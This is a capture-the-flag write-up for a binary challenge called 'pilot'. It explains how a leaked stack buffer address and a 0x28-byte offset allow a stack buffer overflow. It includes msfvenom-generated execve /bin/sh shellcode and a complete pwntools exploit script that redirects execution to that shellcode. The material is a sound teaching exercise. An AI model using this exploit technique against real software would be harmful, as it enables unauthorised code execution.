# App

![image](https://user-images.githubusercontent.com/115867891/206476635-24d9e518-829e-4bc1-aa58-a1ca3bcc2d18.png)

No mitigations => V-EASY

# Dissasembly

It's poluted with `std::`, yay...Hard to find out how to place breakpoint.

`Trick: use info file, and get that entry point address, then make your way with stepin`

Also, check `mov     rdi, offset main ; main` - will give you address of main function.

Basically the dissasembly actually **leaks** the address of the start of the buffer. The buffer can hold 0x20 bytes, but we can read
0x40 (0n60) bytes.

The stack shows 0x28 bytes until return address.

![image](https://user-images.githubusercontent.com/115867891/206478866-9a3ea94a-1549-40f0-9d59-7c02f8781a71.png)

Therefore, since we have:

- a leak address from the stack (beginning of the buffer)
- no flag or function that cand call the flag whatsoever

We need a shellcode that would esentially be small enough to fit, and the to overwrite the return address with the leaked address (which will be
the start of the shellcode).

# Exploit

`msfvenom -p linux/x64/exec --smallest -f python` - generate a shellcode

Shellcode size is 0x15, therefore we must add padding in our payload of size = (0x28 - 0x15) with something (NOPs in this case, why not), and then the leaked address

```
from pwn import *
import sys

target = process('./pilot')

print(target.recvuntil("[*]Location:"))

leak = target.recvline()
leak_addr = int(leak.strip(b"\n"), 16)

print()
print("Leaked address : ", hex(leak_addr))

# 0x28 bytes between start of buffer (leaked addr)
# and return address
DISTANCE = 0x28

# overwrite ret addr with leaked address and place shellcode there
# msfvenom -p linux/x64/exec --smallest -f python
# Payload size: 21 bytes (0x15)
PAYLOAD_SIZE = 0x15
buf =  b""
buf += b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54"
buf += b"\x5f\x52\x5e\x6a\x3b\x58\x0f\x05"

payload = buf + b'\x90' * (DISTANCE - PAYLOAD_SIZE) + p64(leak_addr)
print("Payload : ", payload)

target.send(payload)
target.interactive()
```

![image](https://user-images.githubusercontent.com/115867891/206479714-c71ebc33-77d4-4471-8550-c92fccd55c7a.png)
